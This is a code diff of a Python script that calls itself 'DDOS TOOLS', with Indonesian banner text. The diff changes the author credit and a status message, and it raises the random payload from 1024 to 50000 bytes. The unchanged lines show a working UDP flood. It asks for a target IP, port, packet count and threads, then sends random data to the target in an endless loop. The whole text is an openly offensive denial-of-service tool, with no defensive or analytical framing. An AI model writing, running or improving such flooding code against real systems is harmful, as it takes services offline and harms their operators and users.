@@ -4,9 +4,9 @@ import random
 import socket
 import threading
 
-print("~~~ DDOS TOOLS By Rence ~~~")
-print("~~~ Code and Scripted by Rence ~~~")
-print("~~~ Script ini dibuat hanya untuk rence Pribadi. ~~~")
+print("~~~ DDOS TOOLS By Lx ~~~")
+print("~~~ Code and Scripted by Lx ~~~")
+print("~~~ Script ini dibuat hanya untuk Lx Pribadi. ~~~")
 print("~~~ Don't Forget to subscribe Ren Samp ~~~")
 print("~~~ DDOS by rence dibuat hanya untuk kontent. ~~~")
 ip = str(input(" Target Ip:"))
@@ -15,7 +15,7 @@ choice = str(input(" UDP(y/n):"))
 times = int(input(" Paket yang dikirim ke target:"))
 threads = int(input(" Threads yang dikirim:"))
 def run():
-	data = random._urandom(1024)
+	data = random._urandom(50000)
 	i = random.choice(("[*]","[!]","[#]"))
 	while True:
 		try:
@@ -23,7 +23,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" Sent!!!")
+			print(i +" Farhanganz!!!")
 		except:
 			print("[!] Error!!!")
 
